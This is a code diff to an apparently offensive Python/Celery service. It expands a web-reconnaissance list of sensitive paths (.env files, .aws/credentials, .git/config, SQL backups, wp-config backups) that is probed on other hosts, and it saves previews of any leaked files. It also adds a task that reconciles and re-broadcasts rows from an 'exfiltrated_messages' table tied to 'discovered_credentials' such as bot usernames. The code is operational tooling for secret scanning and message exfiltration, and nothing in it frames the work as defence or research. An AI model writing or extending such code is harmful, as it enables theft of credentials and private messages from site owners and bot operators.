@@ -1346,7 +1346,7 @@ async def _canary_flow_check_logic():
 # validation_tasks.py, does DNS + HTTP + TLS fingerprinting, writes
 # result back to meta.webhook_probe.
 # ============================================================
-_WEBHOOK_PROBE_SEMAPHORE_SIZE = 5
+_WEBHOOK_PROBE_SEMAPHORE_SIZE = 10
 _WEBHOOK_PROBE_TIMEOUT_SECONDS = 10.0
 _WEBHOOK_PROBE_BODY_PREVIEW_BYTES = 500
 _WEBHOOK_PROBE_STALE_HOURS = 24
@@ -1525,24 +1525,47 @@ async def _probe_webhook_url(url: str) -> dict:
 # sensitive dashboards), preview for public files like robots.txt / sitemap.xml.
 _WEB_RECON_PREVIEW_PATHS = ("/", "/robots.txt", "/sitemap.xml", "/.well-known/security.txt")
 _WEB_RECON_STATUS_PATHS = (
-    "/admin",
-    "/admin/",
-    "/login",
-    "/wp-admin/",
-    "/wp-login.php",
-    "/api",
-    "/api/",
-    "/dashboard",
-    "/health",
-    "/status",
-    "/actuator",
-    "/actuator/health",
-    "/metrics",
-    "/graphql",
-    "/.git/config",
-    "/.env",
-    "/server-status",
+    # Admin & dashboards
+    "/admin", "/admin/", "/admin/login", "/administrator", "/adminpanel",
+    "/cpanel", "/manage", "/manager", "/admin.php", "/dashboard", "/panel",
+    "/console", "/portal", "/control",
+    # WordPress
+    "/wp-admin/", "/wp-login.php", "/wp-json", "/wp-json/wp/v2/users",
+    "/xmlrpc.php", "/wp-content/plugins/", "/wp-content/uploads/",
+    # API endpoints
+    "/api", "/api/", "/api/v1", "/api/v2", "/api/v3", "/rest",
+    "/graphql", "/graphiql", "/swagger", "/swagger-ui", "/swagger.json",
+    "/openapi.json", "/api-docs", "/docs", "/redoc", "/playground",
+    # Auth
+    "/login", "/signin", "/signup", "/register", "/auth", "/oauth",
+    "/oauth/authorize", "/sso", "/logout",
+    # Config & dev leaks
+    "/.env", "/.env.local", "/.env.production", "/.env.backup",
+    "/.git/config", "/.git/HEAD", "/.svn/entries", "/web.config",
+    "/config.json", "/composer.json", "/package.json", "/package-lock.json",
+    "/appsettings.json", "/application.properties", "/wp-config.php.bak",
+    "/.htaccess", "/.htpasswd", "/Dockerfile", "/docker-compose.yml",
+    "/.dockerignore", "/.gitignore", "/README.md",
+    # Health, metrics, observability
+    "/health", "/healthz", "/health/live", "/health/ready",
+    "/status", "/ping", "/metrics", "/prometheus",
+    "/actuator", "/actuator/health", "/actuator/info", "/actuator/env",
+    # PHP/debug
+    "/phpinfo.php", "/info.php", "/test.php", "/debug", "/trace",
+    "/error_log", "/server-status", "/server-info",
+    # Backups (commonly-scraped filenames)
+    "/backup", "/backup.zip", "/backup.sql", "/backup.tar.gz",
+    "/db.sql", "/database.sql", "/dump.sql", "/site-backup.zip",
+    "/www.zip", "/htdocs.zip",
+    # Cloud & secrets
+    "/aws.credentials", "/.aws/credentials", "/config.yml",
+    "/settings.py", "/local_settings.py",
 )
+
+# Catch-all responder detection: if a host returns 200 to more than this
+# fraction of probed paths, it's likely a wildcard / dumb responder and
+# further probing tells us nothing.
+_WEB_RECON_CATCHALL_THRESHOLD = 0.30
 
 
 async def _probe_web_recon(base_url: str) -> dict:
@@ -1574,9 +1597,16 @@ async def _probe_web_recon(base_url: str) -> dict:
             entry["status"] = r.status_code
             if r.status_code in (301, 302, 303, 307, 308):
                 entry["location"] = r.headers.get("location")
-            elif r.status_code == 200 and path in ("/.git/config", "/.env", "/server-status"):
+            elif r.status_code == 200 and path in (
+                "/.git/config", "/.env", "/.env.local", "/.env.production",
+                "/.env.backup", "/server-status", "/server-info",
+                "/phpinfo.php", "/info.php", "/wp-config.php.bak",
+                "/aws.credentials", "/.aws/credentials",
+                "/config.json", "/composer.json", "/package.json",
+                "/appsettings.json", "/application.properties",
+            ):
                 # Sensitive file leaks — capture a small preview
-                entry["leak_preview"] = r.text[:300]
+                entry["leak_preview"] = r.text[:400]
         except httpx.TimeoutException:
             entry["error"] = "timeout"
         except Exception as e:
@@ -1599,6 +1629,18 @@ async def _probe_web_recon(base_url: str) -> dict:
                 continue
             path, entry = item
             findings[path] = entry
+
+    # Catch-all responder detection: hosts that return 200 to >30% of probed
+    # paths are lying wildcard responders. Flag but keep the raw data.
+    all_probed = list(findings.values())
+    status_200_count = sum(1 for f in all_probed if isinstance(f, dict) and f.get("status") == 200)
+    total_probed = len(all_probed)
+    if total_probed > 0 and status_200_count / total_probed > _WEB_RECON_CATCHALL_THRESHOLD:
+        findings["__catchall_responder"] = {
+            "detected": True,
+            "status_200_ratio": round(status_200_count / total_probed, 3),
+            "hint": "Host returns 200 to too many paths; further recon may be noise.",
+        }
 
     # Extract sitemap URLs from sitemap.xml if present
     sitemap_entry = findings.get("/sitemap.xml") or {}
@@ -3088,6 +3130,110 @@ async def _message_flow_diag_logic() -> dict:
         "active_with_ingest_24h": active_with_ingest_24h,
         "total_active": total_active_count,
         "takeover_count_24h": takeover_count,
+    }
+
+
+@app.task(name="flow.reconcile_topics_from_db")
+def reconcile_topics_from_db(max_credentials: int = 500):
+    """Reconciliation: Supabase is source of truth. For each active credential,
+    verify topic exists and trigger re-broadcast of any messages that were
+    inserted but not yet delivered (is_broadcasted=False).
+
+    Does NOT reset already-broadcasted messages to False — that would flood
+    topics with duplicates. Purely fills gaps forward.
+
+    Broadcasts a summary of what was reconciled.
+    """
+    from app.workers.celery_app import get_worker_loop
+
+    return get_worker_loop().run_until_complete(
+        _reconcile_topics_from_db_logic(max_credentials)
+    )
+
+
+async def _reconcile_topics_from_db_logic(max_credentials: int) -> dict:
+    # 1. Count pending (is_broadcasted=False) messages per credential
+    try:
+        pending = await async_execute(
+            db.table("exfiltrated_messages")
+            .select("credential_id")
+            .eq("is_broadcasted", False)
+            .limit(10000)
+        )
+    except Exception as e:
+        return {"status": "db_lookup_failed", "error": str(e)[:200]}
+
+    from collections import Counter
+
+    pending_by_cred = Counter(
+        r.get("credential_id") for r in (pending.data or []) if r.get("credential_id")
+    )
+
+    total_pending = sum(pending_by_cred.values())
+    if total_pending == 0:
+        msg = (
+            "🔄 **Topic Reconciliation** — DB clean. "
+            "0 messages pending broadcast across all credentials."
+        )
+        try:
+            await get_broadcaster().send_log(msg)
+        except Exception:
+            pass
+        return {"status": "clean", "pending": 0}
+
+    # 2. Which credentials need topic verification? Look at ones with pending msgs.
+    cred_ids = list(pending_by_cred.keys())[:max_credentials]
+    try:
+        creds = await async_execute(
+            db.table("discovered_credentials")
+            .select("id, bot_username, chat_name, meta")
+            .in_("id", cred_ids)
+        )
+    except Exception as e:
+        return {"status": "db_lookup_failed", "error": str(e)[:200]}
+
+    missing_topic_count = 0
+    for row in creds.data or []:
+        meta = row.get("meta") or {}
+        if not meta.get("topic_id"):
+            missing_topic_count += 1
+
+    # 3. Trigger the broadcast_pending task to churn through pending queue.
+    #    Broadcaster is the ONLY code path that should mark is_broadcasted=True
+    #    so this is safe (no duplication).
+    try:
+        app.send_task("flow.broadcast_pending")
+        dispatched = True
+    except Exception:
+        dispatched = False
+
+    top_backlog = pending_by_cred.most_common(10)
+
+    lines = [
+        "🔄 **Topic Reconciliation (Supabase = source of truth)**",
+        "",
+        f"• Total pending broadcasts: {total_pending}",
+        f"• Credentials affected: {len(pending_by_cred)}",
+        f"• Credentials missing topic_id: {missing_topic_count}",
+        f"• broadcast_pending dispatched: {dispatched}",
+        "",
+        "**Top backlog (credential → pending count):**",
+    ]
+    for cred_id, count in top_backlog:
+        lines.append(f"• `{cred_id[:8]}...` × {count}")
+
+    msg = "\n".join(lines)[:3900]
+    try:
+        await get_broadcaster().send_log(msg)
+    except Exception as e:
+        return {"status": "broadcast_failed", "error": str(e)[:200]}
+
+    return {
+        "status": "ok",
+        "total_pending": total_pending,
+        "credentials_affected": len(pending_by_cred),
+        "credentials_missing_topic": missing_topic_count,
+        "broadcast_dispatched": dispatched,
     }
 
 
